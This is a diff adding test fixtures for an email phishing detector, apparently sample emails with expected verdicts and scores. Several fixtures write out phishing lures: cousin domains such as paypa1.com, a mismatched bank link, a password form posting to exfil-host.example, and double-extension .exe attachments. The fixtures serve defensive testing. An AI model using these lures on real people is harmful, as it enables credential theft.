+        sender_address="news@trusted-news.example",
+        recipient="reader@example.com",
+        subject="Read more",
+        body_html=(
+            "<html><body>"
+            '<p><a href="https://trusted-news.example/article/42">'
+            "https://trusted-news.example/article/42</a></p>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "news@trusted-news.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
+                "dkim=pass header.d=trusted-news.example; "
+                "dmarc=pass header.from=trusted-news.example"
+            )},
+        ],
+    ),
+}
+
+
+# ----- Sender identity isolation -----
+
+SENDER_REPLY_TO_MISMATCH_ONLY = {
+    "label": "Sender isolation — Reply-To on different non-ESP domain (HIGH/1.0 → 22)",
+    "tags": ["reply_to_mismatch", "isolation"],
+    "expected": {
+        "verdict": Verdict.SUSPICIOUS,
+        "min_score": 15,
+        "max_score": 34,
+    },
+    "email": _email(
+        message_id="sender-iso-003",
+        sender_address="info@vendor-corp.example",
+        recipient="customer@example.com",
+        subject="Updated terms",
+        body_text="Our terms of service have been updated. No action needed.",
+        headers=[
+            {"name": "From", "value": "info@vendor-corp.example"},
+            {"name": "Reply-To", "value": "real-payments@unrelated-host.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
+                "dkim=pass header.d=vendor-corp.example; "
+                "dmarc=pass header.from=vendor-corp.example"
+            )},
+        ],
+        reply_to_address="real-payments@unrelated-host.example",
+    ),
+}
+
+SENDER_RETURN_PATH_MISMATCH_ONLY = {
+    "label": "Sender isolation — Return-Path on different non-ESP domain (MEDIUM×0.8)",
+    "tags": ["return_path_mismatch", "isolation"],
+    "expected": {
+        "verdict_in": [Verdict.SAFE, Verdict.SUSPICIOUS],
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="sender-iso-004",
+        sender_address="info@vendor-corp.example",
+        recipient="customer@example.com",
+        subject="Welcome",
+        body_text="Welcome to Vendor Corp.",
+        headers=[
+            {"name": "From", "value": "info@vendor-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
+                "dkim=pass header.d=vendor-corp.example; "
+                "dmarc=pass header.from=vendor-corp.example"
+            )},
+        ],
+        return_path_address="bounce@unrelated-bounce.example",
+    ),
+}
+
+SENDER_TYPOSQUAT_PAYPAL_ONLY = {
+    "label": "Sender isolation — paypa1.com cousin domain (CRITICAL/1.0 → 35)",
+    "tags": ["cousin_domain", "isolation"],
+    "expected": {
+        "verdict": Verdict.LIKELY_MALICIOUS,
+        "min_score": 30,
+        "max_score": 50,
+    },
+    "email": _email(
+        message_id="sender-iso-005",
+        sender_address="hello@paypa1.com",
+        recipient="customer@example.com",
+        subject="Reminder",
+        body_text="Just a friendly reminder.",
+        headers=[
+            {"name": "From", "value": "hello@paypa1.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=paypa1.com; "
+                "dkim=pass header.d=paypa1.com; dmarc=pass header.from=paypa1.com"
+            )},
+        ],
+    ),
+}
+
+SENDER_TYPOSQUAT_GOOGLE_ZERO = {
+    "label": "Sender isolation — g00gle.com cousin (digit-substitution, CRITICAL)",
+    "tags": ["cousin_domain", "isolation"],
+    "expected": {
+        "verdict": Verdict.LIKELY_MALICIOUS,
+        "min_score": 30,
+        "max_score": 50,
+    },
+    "email": _email(
+        message_id="sender-iso-006",
+        sender_address="security@g00gle.com",
+        recipient="user@example.com",
+        subject="Notice",
+        body_text="A new sign-in was recorded.",
+        headers=[
+            {"name": "From", "value": "security@g00gle.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=g00gle.com; "
+                "dkim=pass header.d=g00gle.com; dmarc=pass header.from=g00gle.com"
+            )},
+        ],
+    ),
+}
+
+
+# ----- Body content isolation -----
+
+BODY_URGENCY_ONLY_LIGHT = {
+    "label": "Body isolation — single urgency phrase only (MEDIUM×0.65 → 7.8 SAFE)",
+    "tags": ["urgency", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="body-iso-001",
+        sender_address="ops@regularco.example",
+        recipient="oncall@example.com",
+        subject="Heads up",
+        body_text=(
+            "Please respond immediately if you see anything off in the dashboard. "
+            "Otherwise nothing else to report."
+        ),
+        headers=[
+            {"name": "From", "value": "ops@regularco.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=regularco.example; "
+                "dkim=pass header.d=regularco.example; dmarc=pass header.from=regularco.example"
+            )},
+        ],
+    ),
+}
+
+BODY_URGENCY_ONLY_HEAVY = {
+    "label": "Body isolation — many urgency phrases (MEDIUM×1.0 → 12 SAFE)",
+    "tags": ["urgency", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="body-iso-002",
+        sender_address="ops@regularco.example",
+        recipient="oncall@example.com",
+        subject="Status",
+        body_text=(
+            "Please respond immediately. This is time-sensitive. "
+            "Within 24 hours we expect an update. Service interruption "
+            "may occur. Immediate action required."
+        ),
+        headers=[
+            {"name": "From", "value": "ops@regularco.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=regularco.example; "
+                "dkim=pass header.d=regularco.example; dmarc=pass header.from=regularco.example"
+            )},
+        ],
+    ),
+}
+
+BODY_SENSITIVE_REQUEST_ONLY = {
+    "label": "Body isolation — 'verify your password' phrase only (language-only, deterministic SAFE)",
+    "tags": ["credential_ask", "isolation", "language_only"],
+    # Body-language detection moved to LanguageAssessmentAnalyzer.
+    # Deterministic engine has no rule for "verify your password" phrasing
+    # alone — this pattern is only caught when the language analyzer is wired in.
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="body-iso-003",
+        sender_address="account@vendor-corp.example",
+        recipient="customer@example.com",
+        subject="Account update",
+        body_text=(
+            "We need you to verify your password to keep your account in good standing. "
+            "Thanks for being a customer."
+        ),
+        headers=[
+            {"name": "From", "value": "account@vendor-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
+                "dkim=pass header.d=vendor-corp.example; "
+                "dmarc=pass header.from=vendor-corp.example"
+            )},
+        ],
+    ),
+}
+
+BODY_HTML_FORM_ONLY = {
+    "label": "Body isolation — single HTML form, otherwise clean (CRITICAL → 35)",
+    "tags": ["html_form", "isolation"],
+    "expected": {
+        "verdict": Verdict.LIKELY_MALICIOUS,
+        "min_score": 35,
+        "max_score": 50,
+    },
+    "email": _email(
+        message_id="body-iso-004",
+        sender_address="account@vendor-corp.example",
+        recipient="customer@example.com",
+        subject="Quick poll",
+        body_html=(
+            "<html><body>"
+            "<p>Two-question poll:</p>"
+            '<form action="https://vendor-corp.example/poll" method="POST">'
+            '<input name="q1" type="text"><br>'
+            '<input name="q2" type="text"><br>'
+            '<input type="submit" value="Submit">'
+            "</form>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "account@vendor-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
+                "dkim=pass header.d=vendor-corp.example; "
+                "dmarc=pass header.from=vendor-corp.example"
+            )},
+        ],
+    ),
+}
+
+
+# ----- Attachment isolation -----
+
+ATTACH_EXE_ONLY = {
+    "label": "Attachment isolation — single .exe (CRITICAL×0.95 → 33.25)",
+    "tags": ["attachment_exe", "isolation"],
+    "expected": {
+        "verdict_in": [Verdict.SUSPICIOUS, Verdict.LIKELY_MALICIOUS],
+        "min_score": 25,
+        "max_score": 50,
+    },
+    "email": _email(
+        message_id="attach-iso-001",
+        sender_address="builds@build-bot.example",
+        recipient="dev@example.com",
+        subject="Build artifact",
+        body_text="Latest build attached.",
+        headers=[
+            {"name": "From", "value": "builds@build-bot.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=build-bot.example; "
+                "dkim=pass header.d=build-bot.example; dmarc=pass header.from=build-bot.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "installer.exe", "mime_type": "application/x-msdownload", "size_bytes": 524288},
+        ],
+    ),
+}
+
+ATTACH_DOUBLE_EXTENSION_ONLY = {
+    "label": "Attachment isolation — .pdf.exe double extension (capped at 50)",
+    "tags": ["attachment_exe", "isolation"],
+    "expected": {
+        "verdict": Verdict.LIKELY_MALICIOUS,
+        "min_score": 35,
+        "max_score": 55,
+    },
+    "email": _email(
+        message_id="attach-iso-002",
+        sender_address="invoicing@invoice-host.example",
+        recipient="ap@example.com",
+        subject="Statement",
+        body_text="Statement attached.",
+        headers=[
+            {"name": "From", "value": "invoicing@invoice-host.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=invoice-host.example; "
+                "dkim=pass header.d=invoice-host.example; "
+                "dmarc=pass header.from=invoice-host.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "statement.pdf.exe", "mime_type": "application/x-msdownload", "size_bytes": 102400},
+        ],
+    ),
+}
+
+ATTACH_MACRO_ONLY = {
+    "label": "Attachment isolation — single .docm (HIGH×0.85 → 18.7)",
+    "tags": ["attachment_macro", "isolation"],
+    "expected": {
+        "verdict": Verdict.SUSPICIOUS,
+        "min_score": 15,
+        "max_score": 34,
+    },
+    "email": _email(
+        message_id="attach-iso-003",
+        sender_address="hr@hr-corp.example",
+        recipient="employee@example.com",
+        subject="Employee handbook update",
+        body_text="Updated handbook attached. Please review at your convenience.",
+        headers=[
+            {"name": "From", "value": "hr@hr-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=hr-corp.example; "
+                "dkim=pass header.d=hr-corp.example; dmarc=pass header.from=hr-corp.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "handbook_2026.docm", "mime_type": "application/vnd.ms-word.document.macroEnabled.12", "size_bytes": 81920},
+        ],
+    ),
+}
+
+ATTACH_PASSWORD_ZIP_ONLY = {
+    "label": "Attachment isolation — zip + 'password' in body (HIGH×0.8 → 17.6)",
+    "tags": ["attachment_archive", "isolation"],
+    "expected": {
+        "verdict": Verdict.SUSPICIOUS,
+        "min_score": 15,
+        "max_score": 34,
+    },
+    "email": _email(
+        message_id="attach-iso-004",
+        sender_address="documents@archive-corp.example",
+        recipient="recipient@example.com",
+        subject="Encrypted documents",
+        body_text="Documents attached. Password: Files2026!",
+        headers=[
+            {"name": "From", "value": "documents@archive-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=archive-corp.example; "
+                "dkim=pass header.d=archive-corp.example; "
+                "dmarc=pass header.from=archive-corp.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "documents.zip", "mime_type": "application/zip", "size_bytes": 65536},
+        ],
+    ),
+}
+
+ATTACH_BENIGN_PDF_CLEAN = {
+    "label": "Attachment isolation — single benign PDF, no signal",
+    "tags": ["legitimate", "attachment_safe", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="attach-iso-005",
+        sender_address="reports@finance-team.example",
+        recipient="cfo@example.com",
+        subject="Q1 financial report",
+        body_text="Q1 financials attached for your review.",
+        headers=[
+            {"name": "From", "value": "reports@finance-team.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=finance-team.example; "
+                "dkim=pass header.d=finance-team.example; "
+                "dmarc=pass header.from=finance-team.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "q1_report.pdf", "mime_type": "application/pdf", "size_bytes": 1048576},
+        ],
+    ),
+}
+
+ATTACH_MULTIPLE_BENIGN_CLEAN = {
+    "label": "Attachment isolation — several benign PDFs/images, no signal",
+    "tags": ["legitimate", "attachment_safe", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="attach-iso-006",
+        sender_address="design@design-team.example",
+        recipient="client@example.com",
+        subject="Design mockups, round 2",
+        body_text="Updated mockups attached. Let me know what you think.",
+        headers=[
+            {"name": "From", "value": "design@design-team.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=design-team.example; "
+                "dkim=pass header.d=design-team.example; "
+                "dmarc=pass header.from=design-team.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "mockup_home.png", "mime_type": "image/png", "size_bytes": 524288},
+            {"filename": "mockup_pricing.png", "mime_type": "image/png", "size_bytes": 491520},
+            {"filename": "design_brief.pdf", "mime_type": "application/pdf", "size_bytes": 204800},
+        ],
+    ),
+}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  13. CONVERGENCE / MULTI-CATEGORY MALICIOUS — cross-category boost in play
+# ═══════════════════════════════════════════════════════════════════════════
+
+MULTI_AUTH_PLUS_URL_MISMATCH = {
+    "label": "Multi-cat — DMARC fail + href/text mismatch (2 cat ×1.08 → ~76)",
+    "tags": ["auth_fail", "url_mismatch", "convergence"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="multi-001",
+        sender_address="alerts@bank-host.example",
+        recipient="customer@example.com",
+        subject="Action: review login activity",
+        body_html=(
+            "<html><body>"
+            "<p>We noticed a sign-in. Confirm:</p>"
+            '<p><a href="http://malicious-host.example/login">'
+            "https://www.bank-host.example/secure/login</a></p>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "alerts@bank-host.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=bank-host.example; "
+                "dkim=fail header.d=bank-host.example; dmarc=fail header.from=bank-host.example"
+            )},
+        ],
+    ),
+}
+
+MULTI_AUTH_PLUS_HTML_FORM = {
+    "label": "Multi-cat — DMARC fail + HTML form (2 cat ×1.08 → ~76)",
+    "tags": ["auth_fail", "html_form", "credential_ask", "convergence"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="multi-002",
+        sender_address="auth@auth-host.example",
+        recipient="user@example.com",
+        subject="Verify access",
+        body_html=(
+            "<html><body>"
+            "<p>Confirm credentials:</p>"
+            '<form action="http://exfil-host.example/c" method="POST">'
+            '<input name="u"><input name="p" type="password">'
+            '<input type="submit"></form>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "auth@auth-host.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=auth-host.example; "
+                "dkim=fail header.d=auth-host.example; dmarc=fail header.from=auth-host.example"
+            )},
+        ],
+    ),
+}
+
+MULTI_COUSIN_PLUS_DOUBLE_EXT = {
+    "label": "Multi-cat — cousin domain + double-extension attachment",
+    "tags": ["cousin_domain", "attachment_exe", "convergence"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="multi-003",
+        sender_address="orders@arnazon-care.com",
+        recipient="buyer@example.com",
+        subject="Order details",
+        body_text="Open the attached invoice for details.",
+        headers=[
+            {"name": "From", "value": "orders@arnazon-care.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=arnazon-care.com; "
+                "dkim=pass header.d=arnazon-care.com; "
+                "dmarc=pass header.from=arnazon-care.com"
+            )},
+        ],
+        attachments=[
+            {"filename": "invoice.pdf.exe", "mime_type": "application/x-msdownload", "size_bytes": 102400},
+        ],
+    ),
+}
+
+MULTI_FULL_HOUSE = {
+    "label": "Multi-cat — every category fires (auth + sender + url + body + attach)",
+    "tags": ["auth_fail", "cousin_domain", "ip_url", "credential_ask", "urgency", "attachment_macro", "convergence"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 80,
+    },
+    "email": _email(
+        message_id="multi-004",
+        sender_address="security@app1e-id-support.example",
+        recipient="user@example.com",
+        subject="Immediate action required: verify your identity",
+        body_text=(
+            "Your account will be suspended within 24 hours. "
+            "Please verify your password by visiting: http://198.51.100.50/verify"
+        ),
+        body_html=(
+            "<html><body>"
+            "<p>Your account will be suspended within 24 hours.</p>"
+            "<p>Please verify your password by visiting: "
+            '<a href="http://198.51.100.50/verify">verify now</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "security@app1e-id-support.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=app1e-id-support.example; "
+                "dkim=fail header.d=app1e-id-support.example; "
+                "dmarc=fail header.from=app1e-id-support.example"
+            )},
+        ],
+        attachments=[
+            {"filename": "verification_form.docm", "mime_type": "application/vnd.ms-word.document.macroEnabled.12", "size_bytes": 73728},
+        ],
+    ),
+}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  14. ADDITIONAL EDGE / PARSER TORTURE CASES
+# ═══════════════════════════════════════════════════════════════════════════
+
+EDGE_HTML_ONLY_NO_TEXT = {
+    "label": "Edge — body_html populated but body_text empty",
+    "tags": ["legitimate", "edge"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-html-001",
+        sender_address="news@trusted-news.example",
+        recipient="reader@example.com",
+        subject="Today's edition",
+        body_html="<html><body><p>Today's edition is ready.</p></body></html>",
+        headers=[
+            {"name": "From", "value": "news@trusted-news.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
+                "dkim=pass header.d=trusted-news.example; "
+                "dmarc=pass header.from=trusted-news.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_MALFORMED_HTML = {
+    "label": "Edge — malformed HTML (unclosed tags) should not crash",
+    "tags": ["legitimate", "edge"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-html-002",
+        sender_address="news@trusted-news.example",
+        recipient="reader@example.com",
+        subject="Edition",
+        body_html=(
+            "<html><body><p>Lead<a href='https://trusted-news.example/x'>"
+            "<strong>story<em>broken</strong>"
+        ),
+        headers=[
+            {"name": "From", "value": "news@trusted-news.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
+                "dkim=pass header.d=trusted-news.example; "
+                "dmarc=pass header.from=trusted-news.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_UNICODE_SUBJECT_BODY = {
+    "label": "Edge — non-ASCII subject and body (Hebrew/emoji), legit sender",
+    "tags": ["legitimate", "edge", "unicode"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-uni-001",
+        sender_address="hello@friendly-co.example",
+        recipient="recipient@example.com",
+        subject="שלום! 🎉 Welcome",
+        body_text="ברוכים הבאים! Glad to have you on board. 🚀",
+        headers=[
+            {"name": "From", "value": "hello@friendly-co.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=friendly-co.example; "
+                "dkim=pass header.d=friendly-co.example; "
+                "dmarc=pass header.from=friendly-co.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_VERY_LONG_SUBJECT = {
+    "label": "Edge — extremely long subject line, legit sender",
+    "tags": ["legitimate", "edge"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-long-001",
+        sender_address="news@trusted-news.example",
+        recipient="reader@example.com",
+        subject=("Daily news " + "extra " * 80).strip(),
+        body_text="Today's edition is ready.",
+        headers=[
+            {"name": "From", "value": "news@trusted-news.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
+                "dkim=pass header.d=trusted-news.example; "
+                "dmarc=pass header.from=trusted-news.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_SCRIPT_STYLE_TAGS_IGNORED = {
+    "label": "Edge — sensitive phrase only inside <script>/<style> (must be ignored)",
+    "tags": ["legitimate", "edge"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-script-001",
+        sender_address="news@trusted-news.example",
+        recipient="reader@example.com",
+        subject="Newsletter",
+        body_html=(
+            "<html><head>"
+            "<style>/* update your password is just CSS comment text */</style>"
+            "<script>// 'verify your account' inside JS comment</script>"
+            "</head><body><p>Today's edition.</p></body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "news@trusted-news.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
+                "dkim=pass header.d=trusted-news.example; "
+                "dmarc=pass header.from=trusted-news.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_MULTIPLE_AUTH_HEADERS = {
+    "label": "Edge — multiple Authentication-Results headers (first wins, expect SAFE)",
+    "tags": ["legitimate", "edge", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-auth-001",
+        sender_address="ops@regularco.example",
+        recipient="customer@example.com",
+        subject="Hello",
+        body_text="Just a friendly hello.",
+        headers=[
+            {"name": "From", "value": "ops@regularco.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=regularco.example; "
+                "dkim=pass header.d=regularco.example; dmarc=pass header.from=regularco.example"
+            )},
+            {"name": "Authentication-Results", "value": (
+                "upstream-relay.example; spf=fail smtp.mailfrom=regularco.example; "
+                "dkim=fail header.d=regularco.example; dmarc=fail header.from=regularco.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_AUTH_RESULTS_WITH_COMMENTS = {
+    "label": "Edge — Authentication-Results with parenthesized comments around tokens",
+    "tags": ["legitimate", "edge", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-auth-002",
+        sender_address="ops@regularco.example",
+        recipient="customer@example.com",
+        subject="Hi",
+        body_text="Routine update.",
+        headers=[
+            {"name": "From", "value": "ops@regularco.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass (sender IP is 198.51.100.5) "
+                "smtp.mailfrom=regularco.example; "
+                "dkim=pass (signature was verified) header.d=regularco.example; "
+                "dmarc=pass (policy matched) header.from=regularco.example"
+            )},
+        ],
+    ),
+}
+
+EDGE_REPLY_TO_SAME_DOMAIN = {
+    "label": "Edge — Reply-To on same domain as sender (no signal)",
+    "tags": ["legitimate", "edge", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-replyto-001",
+        sender_address="alice@vendor-corp.example",
+        recipient="customer@example.com",
+        subject="Quick reply",
+        body_text="Thanks. Replying from a different alias.",
+        headers=[
+            {"name": "From", "value": "alice@vendor-corp.example"},
+            {"name": "Reply-To", "value": "alice.replies@vendor-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=vendor-corp.example; "
+                "dkim=pass header.d=vendor-corp.example; "
+                "dmarc=pass header.from=vendor-corp.example"
+            )},
+        ],
+        reply_to_address="alice.replies@vendor-corp.example",
+    ),
+}
+
+EDGE_RETURN_PATH_TO_ESP = {
+    "label": "Edge — Return-Path to ESP (sendgrid) → no mismatch signal",
+    "tags": ["legitimate", "edge", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-rp-001",
+        sender_address="news@bigshop.example.com",
+        recipient="reader@example.com",
+        subject="This week",
+        body_text="This week's picks are inside.",
+        headers=[
+            {"name": "From", "value": "news@bigshop.example.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=sendgrid.net; "
+                "dkim=pass header.d=bigshop.example.com; "
+                "dmarc=pass header.from=bigshop.example.com"
+            )},
+        ],
+        return_path_address="bounces+xyz@em.sendgrid.net",
+    ),
+}
+
+EDGE_SENDER_NO_AT_SIGN = {
+    "label": "Edge — sender_address malformed (no '@'), should yield blind spot",
+    "tags": ["edge"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-sender-001",
+        sender_address="not-an-email-address",
+        recipient="user@example.com",
+        subject="Internal note",
+        body_text="Just a note.",
+        headers=[
+            {"name": "From", "value": "not-an-email-address"},
+        ],
+    ),
+}
+
+EDGE_FREEMAIL_WITH_PERSONAL_NAME = {
+    "label": "Edge — freemail sender, personal display name (no org keyword) → no signal",
+    "tags": ["legitimate", "freemail", "edge", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="edge-freemail-001",
+        sender_address="jenny.h.42@gmail.com",
+        sender_display_name="Jenny H",
+        recipient="friend@example.com",
+        subject="Coffee soon?",
+        body_text="Want to grab coffee Friday afternoon?",
+        headers=[
+            {"name": "From", "value": "Jenny H <jenny.h.42@gmail.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
+                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
+            )},
+        ],
+    ),
+}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
 #  BACKWARD-COMPATIBLE ALIASES
 # ═══════════════════════════════════════════════════════════════════════════
 
@@ -1602,6 +3296,15 @@ ALL_FIXTURES: list[dict] = [
     MASS_PHISHING_MICROSOFT,
     PHISHING_BANK_HTML_FORM,
     PHISHING_HIDDEN_URL,
+    PHISHING_NETFLIX_PAYMENT_HOLD,
+    PHISHING_FEDEX_DELIVERY_FEE,
+    PHISHING_INSTAGRAM_LOGIN_ALERT,
+    PHISHING_DROPBOX_SHARED_FILE,
+    PHISHING_IRS_TAX_REFUND,
+    PHISHING_LINKEDIN_INMAIL,
+    PHISHING_CHASE_BANK_LOCKOUT,
+    PHISHING_SPOTIFY_PAYMENT_FAILED,
+    PHISHING_DOCUSIGN_LOOKALIKE,
     # Spear phishing
     SPEAR_PHISH_COUSIN_DOMAIN,
     SPEAR_PHISH_THREAD_HIJACK,
@@ -1646,9 +3349,85 @@ ALL_FIXTURES: list[dict] = [
     # Special
     CALLBACK_PHISHING,
     CREDENTIAL_PHISH_OAUTH,
+    # Simple smoke checks
+    SIMPLE_PLAIN_TEXT_HELLO,
+    SIMPLE_AUTH_PASS_TRANSACTIONAL,
+    SIMPLE_INTERNAL_REPLY,
+    SIMPLE_LINKEDIN_NOTIFICATION,
+    SIMPLE_DOCUSIGN_REQUEST,
+    SIMPLE_CALENDAR_REMINDER,
+    SIMPLE_PR_MERGE_NOTIFICATION,
+    SIMPLE_AWS_BILLING_RECEIPT,
+    SIMPLE_SHORT_HTML_NEWSLETTER,
+    SIMPLE_TWO_LINE_AUTOREPLY,
+    # Auth isolation
+    AUTH_DMARC_FAIL_ONLY,
+    AUTH_SPF_SOFTFAIL_ONLY,
+    AUTH_SPF_NONE_BLINDSPOT,
+    AUTH_TEMPERROR_BLINDSPOT_ONLY,
+    AUTH_NO_HEADERS_BLINDSPOT,
+    AUTH_DKIM_FAIL_ONLY,
+    # URL isolation
+    URL_IP_LITERAL_ONLY,
+    URL_HREF_TEXT_MISMATCH_ONLY,
+    URL_BARE_PLAIN_LINK_CLEAN,
+    URL_HREF_MATCHING_DISPLAY_CLEAN,
+    # Sender isolation
+    SENDER_REPLY_TO_MISMATCH_ONLY,
+    SENDER_RETURN_PATH_MISMATCH_ONLY,
+    SENDER_TYPOSQUAT_PAYPAL_ONLY,
+    SENDER_TYPOSQUAT_GOOGLE_ZERO,
+    # Body isolation
+    BODY_URGENCY_ONLY_LIGHT,
+    BODY_URGENCY_ONLY_HEAVY,
+    BODY_SENSITIVE_REQUEST_ONLY,
+    BODY_HTML_FORM_ONLY,
+    # Attachment isolation
+    ATTACH_EXE_ONLY,
+    ATTACH_DOUBLE_EXTENSION_ONLY,
+    ATTACH_MACRO_ONLY,
+    ATTACH_PASSWORD_ZIP_ONLY,
+    ATTACH_BENIGN_PDF_CLEAN,
+    ATTACH_MULTIPLE_BENIGN_CLEAN,
+    # Multi-category convergence
+    MULTI_AUTH_PLUS_URL_MISMATCH,
+    MULTI_AUTH_PLUS_HTML_FORM,
+    MULTI_COUSIN_PLUS_DOUBLE_EXT,
+    MULTI_FULL_HOUSE,
+    # Additional edge / parser torture
+    EDGE_HTML_ONLY_NO_TEXT,
+    EDGE_MALFORMED_HTML,
+    EDGE_UNICODE_SUBJECT_BODY,
+    EDGE_VERY_LONG_SUBJECT,
+    EDGE_SCRIPT_STYLE_TAGS_IGNORED,
+    EDGE_MULTIPLE_AUTH_HEADERS,
+    EDGE_AUTH_RESULTS_WITH_COMMENTS,
+    EDGE_REPLY_TO_SAME_DOMAIN,
+    EDGE_RETURN_PATH_TO_ESP,
+    EDGE_SENDER_NO_AT_SIGN,
+    EDGE_FREEMAIL_WITH_PERSONAL_NAME,
 ]
 
-SAFE_FIXTURES = [f for f in ALL_FIXTURES if f["expected"].get("verdict") == Verdict.SAFE]
+
+def _verdict_in_expected(fixture: dict, verdict: Verdict) -> bool:
+    """True if *verdict* is a possible expected outcome for *fixture*."""
+    expected = fixture["expected"]
+    if expected.get("verdict") == verdict:
+        return True
+    return verdict in (expected.get("verdict_in") or ())
+
+
